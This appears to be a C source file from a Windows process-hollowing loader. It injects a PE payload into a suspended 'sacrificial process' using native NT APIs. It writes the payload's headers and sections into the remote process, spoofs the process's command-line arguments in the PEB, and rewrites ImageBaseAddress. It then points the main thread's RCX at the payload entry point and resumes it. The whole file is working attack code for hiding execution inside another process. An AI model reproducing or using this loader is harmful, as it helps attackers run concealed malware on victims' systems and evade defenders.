#define _CRT_SECURE_NO_WARNINGS
#include "main.h"
#include "structs.h"



/*------------------------------------------
  Fix the PE sections's memory permissions
------------------------------------------*/
BOOL FixMem(HANDLE hProcess, ULONG_PTR pPeBaseAddr, PIMAGE_NT_HEADERS pNtHdrs, PIMAGE_SECTION_HEADER pSectHdrs) {

	DWORD old = 0;
	SIZE_T secSize = 0;
	PVOID secAddr = NULL;
	NTSTATUS status = NULL;

	DEBUG_PRINT("[*] Fixing sections memory permissions, number of sections: %d\n", pNtHdrs->FileHeader.NumberOfSections);

	//Loop trough each section
	for (DWORD i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++) {

		DWORD old = NULL, MemProtect = NULL;

		if (!pSectHdrs[i].SizeOfRawData && !pSectHdrs[i].VirtualAddress) {
			DEBUG_PRINT("[*] skipping..");
			continue;
		}

		DEBUG_PRINT("[*] Checking memory protection for section: %d\n", i);
		DEBUG_PRINT("\t> Section name: %s, size: %d\n", pSectHdrs[i].Name, pSectHdrs[i].SizeOfRawData);
		//Get memory permissions based on section characteristics
		if (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
			MemProtect = PAGE_WRITECOPY;
			DEBUG_PRINT("\t> PAGE_WRITECOPY\n");
		}
		if (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_READ) {
			MemProtect = PAGE_READONLY;
			DEBUG_PRINT("\t> PAGE_READONLY\n");
		}
		if ((pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_READ)) {
			MemProtect = PAGE_READWRITE;
			DEBUG_PRINT("\t> PAGE_READWRITE\n");
		}
		if (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
			MemProtect = PAGE_EXECUTE;
			DEBUG_PRINT("\t> PAGE_EXECUTE\n");
		}
		if ((pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_WRITE)) {
			MemProtect = PAGE_EXECUTE_WRITECOPY;
			DEBUG_PRINT("\t> PAGE_EXECUTE_WRITECOPY\n");
		}
		if ((pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_READ)) {
			MemProtect = PAGE_EXECUTE_READ;
			DEBUG_PRINT("\t> PAGE_EXECUTE_READ\n");
		}
		if (
			(pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			&& (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			&& (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_READ)
			) {
			MemProtect = PAGE_EXECUTE_READWRITE;
			DEBUG_PRINT("\t> PAGE_EXECUTE_READWRITE\n");
		}

		secSize = pSectHdrs[i].SizeOfRawData;
		secAddr = (pPeBaseAddr + pSectHdrs[i].VirtualAddress);

		status = NtAPIs.pNtProtectVirtualMemory(hProcess, &secAddr, &secSize, MemProtect, &old);
		if (status != 0x00) {
			DEBUG_PRINT("[!] Failed applying memory protection for section: %d, error: 0x%X\n", i, status);
			return FALSE;
		}

	}

	DEBUG_PRINT("[*] Finished applying sections memory protections\n");
	return TRUE;
}


/*---------------------------------
  Spoof the arguments of the 
  sacrificial process
---------------------------------*/
BOOL SpoofArgs(HANDLE hProcess, ULONG_PTR pPEB) {

	PPEB PEBBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEB));
	PRTL_USER_PROCESS_PARAMETERS pParamBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(RTL_USER_PROCESS_PARAMETERS));
	SIZE_T read = NULL;
	NTSTATUS status = NULL;
	DWORD written = 0;

	//Prepare the new arguments for the choosen PE
	WCHAR new[MAX_PATH];
	wcscpy(new, SPAWN_PROCESS);
	wcscat(new, L" ");
	wcscat(new, PE_ARGS);
	DWORD new_size = lstrlenW(new) * sizeof(WCHAR) + sizeof(WCHAR);


	//Read PEB
	DEBUG_PRINT("\t> reading peb to find ProcessParameters\n");
	status = NtAPIs.pNtReadVirtualMemory(hProcess, pPEB, PEBBuffer, sizeof(PEB), &read);
	if (status != 0x00) {
		DEBUG_PRINT("[!] Reading PEB failed: %d\n", GetLastError());
		return FALSE;
	}

	DEBUG_PRINT("\t> reading ProcessParameters struct\n");
	status = NtAPIs.pNtReadVirtualMemory(hProcess, PEBBuffer->ProcessParameters, pParamBuffer, sizeof(RTL_USER_PROCESS_PARAMETERS), &read);
	if (status != 0x00) {
		DEBUG_PRINT("[!] Reading proc params failed: %d\n", GetLastError());
		return FALSE;
	}

	WDEBUG_PRINT(L"\t> writing new arguments to the commandline buffer\n\t\t %s\n", new);
	status = NtAPIs.pNtWriteVirtualMemory(hProcess, (PVOID)pParamBuffer->CommandLine.Buffer, new, new_size, &written);
	if (status != 0x00) {
		printf("[!] Failed updating PEB: 0x%X\n", status);
		return FALSE;
	}

	DEBUG_PRINT("\t> arguments spoofed\n");
	HeapFree(GetProcessHeap(), NULL, PEBBuffer);
	HeapFree(GetProcessHeap(), NULL, pParamBuffer);
	return TRUE;
}



/*----------------------------------------------------------
  Instead of unmapping the sacrificial process's image
  a better approach is to just update the ImageBaseAddress
  inside PEB, in order to get it the main thread's RDX
  register can be used (it points to the process' PEB)
----------------------------------------------------------*/
BOOL UpdateContext(PEHDRS PeHdrs, PBYTE peAddr, PROCESS_INFORMATION procInfo, PCONTEXT tctx) {
	DEBUG_PRINT("\t> getting the remote process's PEB trough RDX\n");

	ULONG_PTR ImageBaseAddressOffset = NULL;
	SIZE_T written = NULL;
	NTSTATUS status = NULL;

	ULONG_PTR pPEB = tctx->Rdx;

	DEBUG_PRINT("\t> PEB Address: 0x%p\n", (PVOID)tctx->Rdx);
	ImageBaseAddressOffset = (PVOID)(pPEB + offsetof(PEB, Reserved3[1]));

	//Attempt to spoof the process's arguments
	if (!SpoofArgs(procInfo.hProcess, pPEB)) {
		printf("spoofing failed? \n");
		return FALSE;
	}

	DEBUG_PRINT("\t> updating the ImageBaseAddress on address: 0x%p\n", ImageBaseAddressOffset);
	status = NtAPIs.pNtWriteVirtualMemory(procInfo.hProcess, (PVOID)ImageBaseAddressOffset, &peAddr, sizeof(PVOID), &written);
	if (status != 0x00) {
		DEBUG_PRINT("[!] Failed updating ImageBaseAddress: 0x%X, written: %d\n", status, written);
		return FALSE;
	}

	//Point RCX to the entrypoint of the PE
	DEBUG_PRINT("\t> updating RCX to the PE's entrypoint\n");
	tctx->Rcx = (PVOID)(peAddr + PeHdrs.pNtHeaders->OptionalHeader.AddressOfEntryPoint);

	return TRUE;
}



/*---------------------------------
  Hijack the sacrificial process's
  main thread for PE execution
---------------------------------*/
BOOL HijackThread(PBYTE peAddr, PROCESS_INFORMATION procInfo, PEHDRS PeHdrs) {

	DEBUG_PRINT("[*] Updating the main thread's contenxt\n");

	NTSTATUS status = NULL;
	CONTEXT tctx = {
	   .ContextFlags = CONTEXT_ALL
	};

	DEBUG_PRINT("\t> getting context\n");
	status = NtAPIs.pNtGetContextThread(procInfo.hThread, &tctx);
	if (status != 0x00) {
		DEBUG_PRINT("[!] Failed getting thread context: 0x%X\n", status);
		return FALSE;
	}

	//update the main thread contenxt
	if (!UpdateContext(PeHdrs, peAddr, procInfo, &tctx)) {
		return FALSE;
	}


	DEBUG_PRINT("\t> setting the new context\n");
	status = NtAPIs.pNtSetContextThread(procInfo.hThread, &tctx);
	if (status != 0x00) {
		DEBUG_PRINT("[!] Failed updating thread context: 0x%X\n", status);
		return FALSE;
	}
	return TRUE;
}


/*--------------------------------------
  Prepare the PE that will be injected
--------------------------------------*/
BOOL PreparePE(PROCESS_INFORMATION procInfo, PEHDRS PeHdrs) {

	DEBUG_PRINT("[*] Preparing the loaded PE\n");
	PBYTE peAddr = PeHdrs.pNtHeaders->OptionalHeader.ImageBase;
	NTSTATUS status = NULL;

	//Allocate memory in the remote process for the PE
	SIZE_T peSize = PeHdrs.pNtHeaders->OptionalHeader.SizeOfImage;
	DEBUG_PRINT("\t> allocating memory with size: %d\n", peSize);
	status = NtAPIs.pNtAllocateVirtualMemory(procInfo.hProcess, &peAddr, 0, &peSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != 0x00) {
		DEBUG_PRINT("[!] Failed allocating memory: 0x%X\n", status);
		return FALSE;
	}

	//Write the PE's headers
	DEBUG_PRINT("\t> writing the PE headers on address: 0x%p\n", peAddr);
	ULONG written = 0;
	status = NtAPIs.pNtWriteVirtualMemory(procInfo.hProcess, peAddr, PeHdrs.pPeBuffer, PeHdrs.pNtHeaders->OptionalHeader.SizeOfHeaders, &written);
	if (status != 0x00) {
		DEBUG_PRINT("[!] Failed writing the PE paylod: 0x%X, written: %d\n", status, written);
		return FALSE;
	}

	//Write the PE's sections
	DEBUG_PRINT("\t> writing the PE's sections\n");
	for (int i = 0; i < PeHdrs.pNtHeaders->FileHeader.NumberOfSections; i++) {

		status = NtAPIs.pNtWriteVirtualMemory(
			procInfo.hProcess, 
			(PVOID)(peAddr + PeHdrs.pSectHeader[i].VirtualAddress),
			(PVOID)(PeHdrs.pPeBuffer + PeHdrs.pSectHeader[i].PointerToRawData),
			PeHdrs.pSectHeader[i].SizeOfRawData,
			&written
			);
		if (status != 0x00) {
			DEBUG_PRINT("[!] Failed writing section: %d, status: 0x%X\n", i , status);
			return FALSE;
		}
	}

	//Hijack the main thread by updateing the PEB->ImageBase and RCX to pe's entrypoint
	if (!HijackThread(peAddr, procInfo, PeHdrs)) {
		return FALSE;
	}

    //Fix the memory permissions of the PE's sections
	if (!FixMem(procInfo.hProcess, peAddr, PeHdrs.pNtHeaders, PeHdrs.pSectHeader)) {
		return FALSE;
	}
	return TRUE;
}


/*-----------------------------------
  Execute the PE and read the output
-----------------------------------*/
BOOL ExecPE(PROCESS_INFORMATION procInfo, HANDLE stdOutRead) {

	DEBUG_PRINT("[*] Executing the PE\n");
	NTSTATUS status = NULL;
	getchar();
	DEBUG_PRINT("\t> resuming the remote process's main thread\n");
	status = NtAPIs.pNtResumeThread(procInfo.hThread, NULL);
	if (status != 0x00) {
		DEBUG_PRINT("[!] Resuming the main thread failed: 0x%X\n", status);
		return FALSE;
	}


	DEBUG_PRINT("\t> waiting for execution to finish\n");
	status = NtAPIs.pNtWaitForSingleObject(procInfo.hThread, FALSE, NULL);

	DEBUG_PRINT("\t> reading the PE's output\n");

	DWORD bytesAvailable = NULL;
	PBYTE buffer = NULL;
	BOOL state = FALSE;

	do {
		PeekNamedPipe(stdOutRead, NULL, NULL, NULL, &bytesAvailable, NULL);
		buffer = LocalAlloc(LPTR, (SIZE_T)bytesAvailable);
		if (!buffer) {
			DEBUG_PRINT("[!] Could not allocate buffer\n");
			break;
		}

		state = ReadFile(stdOutRead, buffer, bytesAvailable, NULL, NULL);
		if (!state) {
			LocalFree(buffer);
			break;
		}
		printf(buffer);
		LocalFree(buffer);

	} while (state);
	return TRUE;
}